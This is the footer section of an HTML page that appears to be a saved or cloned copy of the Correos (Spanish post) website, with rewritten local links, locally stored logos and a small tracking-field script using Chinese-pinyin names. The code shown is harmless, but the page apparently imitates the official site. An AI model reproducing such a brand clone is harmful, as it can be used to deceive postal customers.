																		<a href="/www.youtube.com/user/canalcorreos.html" target="_blank" class="cdk-social__lnk sc-correos-cdk-core-footer" title="Ir a Ir a Youtube" aria-label="Ir a Ir a Youtube"><i class="icon-youtube sc-correos-cdk-core-footer"></i></a>
																	</li>
																</ul>
															</div>
														</li>
													</ul>
													<div class="cdk-container-white-img sc-correos-cdk-core-footer">
														<div class="cdk-app-list sc-correos-cdk-core-footer"><span class="cdk-title sc-correos-cdk-core-footer">Descarga la
																App de Correos</span>
															<ul class="cdk-app-list__list sc-correos-cdk-core-footer">
																<li class="cdk-app-list__item sc-correos-cdk-core-footer">
																	<correos-ui-button-apps href-link="https://apps.apple.com/app/correos-info/id486322953" image-url="/content/dam/correos/imagenes/iconos/home/apps/apple_store.jpg" image-alt="App Store" class="sc-correos-cdk-core-footer sc-correos-ui-button-apps-h sc-correos-ui-button-apps-s hydrated" target="_blank" variant="footer"><a href="/apps.apple.com/app/correos-info/id486322953.html" target="_blank" class="sc-correos-ui-button-apps"><img src="./files/img/apple_store.jpg" alt="App Store" class="ui-img sc-correos-ui-button-apps"></a>
																	</correos-ui-button-apps>
																</li>
																<li class="cdk-app-list__item sc-correos-cdk-core-footer">
																	<correos-ui-button-apps href-link="https://play.google.com/store/apps/details?id=es.correos.widget&amp;hl=es" image-url="/content/dam/correos/imagenes/iconos/home/apps/google_play.jpg" image-alt="Google Play" class="sc-correos-cdk-core-footer sc-correos-ui-button-apps-h sc-correos-ui-button-apps-s hydrated" target="_blank" variant="footer"><a href="/play.google.com/store/apps/details?id=es.correos.widget&amp;hl=es.html" target="_blank" class="sc-correos-ui-button-apps"><img src="./files/img/google_play.jpg" alt="Google Play" class="ui-img sc-correos-ui-button-apps"></a>
																	</correos-ui-button-apps>
																</li>
																<li class="cdk-app-list__item sc-correos-cdk-core-footer">
																	<correos-ui-button-apps href-link="https://appgallery.huawei.com/#/app/C102638007?pkgName=es.correos.widget&amp;channelId=i&amp;referrer=&amp;detailType=0&amp;callType=AGDLINK" image-url="/content/dam/correos/imagenes/ilustraciones/logos/huawei.svg" image-alt="Haweii" class="sc-correos-cdk-core-footer sc-correos-ui-button-apps-h sc-correos-ui-button-apps-s hydrated" target="_blank" variant="footer"><a href="/appgallery.huawei.com/#/app/c102638007?pkgname=es.correos.widget&amp;channelid=i&amp;referrer=&amp;detailtype=0&amp;calltype=agdlink.html" target="_blank" class="sc-correos-ui-button-apps"><img src="./files/img/huawei.svg" alt="Haweii" class="ui-img sc-correos-ui-button-apps"></a>
																	</correos-ui-button-apps>
																</li>
															</ul>
														</div>
														<div class="cdk-pay-list sc-correos-cdk-core-footer"><span class="cdk-title sc-correos-cdk-core-footer">Métodos de
																pago</span>
															<ul class="cdk-pay-list__list sc-correos-cdk-core-footer">
																<li class="cdk-pay-list__container-img sc-correos-cdk-core-footer">
																	<correos-cdk-imageblock class="--padding sc-correos-cdk-core-footer sc-correos-cdk-imageblock-h sc-correos-cdk-imageblock-s hydrated" url-image="/content/dam/prepago/imagenes/logos/logo-mastercard.png" alt-image="MasterCard">
																		<figure class="sc-correos-cdk-imageblock"><img class="sc-correos-cdk-imageblock" src="./files/img/logo-mastercard.png" alt="MasterCard"></figure>
																	</correos-cdk-imageblock>
																</li>
																<li class="cdk-pay-list__container-img sc-correos-cdk-core-footer">
																	<correos-cdk-imageblock class="--padding sc-correos-cdk-core-footer sc-correos-cdk-imageblock-h sc-correos-cdk-imageblock-s hydrated" url-image="/content/dam/correos/imagenes/iconos/pie/paypal.svg.svg" alt-image="PayPal">
																		<figure class="sc-correos-cdk-imageblock"><img class="sc-correos-cdk-imageblock" src="./files/img/paypal.svg.svg" alt="PayPal"></figure>
																	</correos-cdk-imageblock>
																</li>
																<li class="cdk-pay-list__container-img sc-correos-cdk-core-footer">
																	<correos-cdk-imageblock class="--padding sc-correos-cdk-core-footer sc-correos-cdk-imageblock-h sc-correos-cdk-imageblock-s hydrated" url-image="/content/dam/correos/imagenes/iconos/pie/maestro.svg" alt-image="Maestro">
																		<figure class="sc-correos-cdk-imageblock"><img class="sc-correos-cdk-imageblock" src="./files/img/maestro.svg" alt="Maestro"></figure>
																	</correos-cdk-imageblock>
																</li>
																<li class="cdk-pay-list__container-img sc-correos-cdk-core-footer">
																	<correos-cdk-imageblock class="--padding sc-correos-cdk-core-footer sc-correos-cdk-imageblock-h sc-correos-cdk-imageblock-s hydrated" url-image="/content/dam/correos/imagenes/iconos/pie/visa.svg" alt-image="Visa">
																		<figure class="sc-correos-cdk-imageblock"><img class="sc-correos-cdk-imageblock" src="./files/img/visa.svg" alt="Visa">
																		</figure>
																	</correos-cdk-imageblock>
																</li>
																<li class="cdk-pay-list__container-img sc-correos-cdk-core-footer">
																	<correos-cdk-imageblock class="--padding sc-correos-cdk-core-footer sc-correos-cdk-imageblock-h sc-correos-cdk-imageblock-s hydrated" url-image="/content/dam/correos/imagenes/iconos/pie/log amex.svg" alt-image="American Express">
																		<figure class="sc-correos-cdk-imageblock"><img class="sc-correos-cdk-imageblock" src="./files/img/log amex.svg" alt="American Express"></figure>
																	</correos-cdk-imageblock>
																</li>
															</ul>
														</div>
														<div class="cdk-certificate-list sc-correos-cdk-core-footer">
															<span class="cdk-title sc-correos-cdk-core-footer">Certificados</span>
															<ul class="cdk-certificate-list__list sc-correos-cdk-core-footer">
																<li class="cdk-certificate-list__container-img sc-correos-cdk-core-footer">
																	<correos-cdk-imageblock url-image="/content/dam/correos/imagenes/iconos/pie/w3c.svg" alt-image="w3c" class="sc-correos-cdk-core-footer sc-correos-cdk-imageblock-h sc-correos-cdk-imageblock-s hydrated">
																		<figure class="sc-correos-cdk-imageblock"><img class="sc-correos-cdk-imageblock" src="./files/img/w3c.svg" alt="w3c">
																		</figure>
																	</correos-cdk-imageblock>
																</li>
															</ul>
														</div>
													</div>
												</div>
											</div>
										</section>
										<section class="cdk-section-lite sc-correos-cdk-core-footer">
											<div class="cdk-lite-footer wrapper-main sc-correos-cdk-core-footer">
												<div class="cdk-image sc-correos-cdk-core-footer">
													<correos-cdk-imageblock url-image="/content/dam/correos/imagenes/iconos/pie/ico-splash.svg" alt-image="Correos" class="sc-correos-cdk-core-footer sc-correos-cdk-imageblock-h sc-correos-cdk-imageblock-s hydrated">
														<figure class="sc-correos-cdk-imageblock"><img class="sc-correos-cdk-imageblock" src="./files/img/ico-splash.svg" alt="Correos">
														</figure>
													</correos-cdk-imageblock>
												</div>
												<div class="cdk-container-lite-footer sc-correos-cdk-core-footer">
													<ul class="cdk-contact sc-correos-cdk-core-footer">
														<li class="cdk-contact__item sc-correos-cdk-core-footer"><a href="/www.correos.es/es/es/legales/politica-de-cookies.html" target="_self" class="cdk-contact__lnk sc-correos-cdk-core-footer" title="Ir a Política de cookies">Política de cookies</a>
														</li>
														<li class="cdk-contact__item sc-correos-cdk-core-footer"><a href="/www.correos.es/es/es/legales/aviso-legal.html" target="_self" class="cdk-contact__lnk sc-correos-cdk-core-footer" title="Ir a Aviso legal">Aviso legal</a></li>
														<li class="cdk-contact__item sc-correos-cdk-core-footer"><a href="/www.correos.es/es/es/legales/privacidad-web.html" target="_self" class="cdk-contact__lnk sc-correos-cdk-core-footer" title="Ir a Privacidad web">Privacidad web</a></li>
														<li class="cdk-contact__item sc-correos-cdk-core-footer"><a href="/www.correos.es/es/es/legales/alerta-de-seguridad.html" target="_self" class="cdk-contact__lnk sc-correos-cdk-core-footer" title="Ir a Alerta seguridad">Alerta seguridad</a></li>
														<li class="cdk-contact__item sc-correos-cdk-core-footer"><a href="/www.correos.es/es/es/legales/accesibilidad.html" target="_self" class="cdk-contact__lnk sc-correos-cdk-core-footer" title="Ir a Accesibilidad">Accesibilidad</a></li>
													</ul>
													<p class="cdk-text-footer sc-correos-cdk-core-footer">©Sociedad
														Estatal Correos y Telegrafos, S.A., S.M.E. Todos los derechos
														reservados.</p>
												</div>
											</div>
										</section>
									</correos-cdk-core-footer>
									<div></div>
								</div>
								<div class="  aem-GridColumn aem-GridColumn--default--12">
									<div></div>
								</div>
							</div>
							<div></div>
						</div>
					</div>
					<div></div>
				</div>
			</div>
		</div>




		<div class="VIpgJd-ZVi9od-aZ2wEe-wOHMyf">
			<div class="VIpgJd-ZVi9od-aZ2wEe-OiiCO"><svg xmlns="http://www.w3.org/2000/svg" class="VIpgJd-ZVi9od-aZ2wEe" width="96px" height="96px" viewBox="0 0 66 66">
					<circle class="VIpgJd-ZVi9od-aZ2wEe-Jt5cK" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle>
				</svg></div>
		</div>
		<script>
			function danhaoOnfocus(){
				document.getElementById("danhaola").style.display = "none";
			}
			function danhaoOnblur(){
				var danhaoValue = document.getElementById("formLocator").value;
				if(danhaoValue=="" || danhaoValue.length<=0){
					document.getElementById("danhaola").style.display = "block";
				}else{
					document.getElementById("danhaola").style.display = "none";
				}
			}
		</script>





</body></html>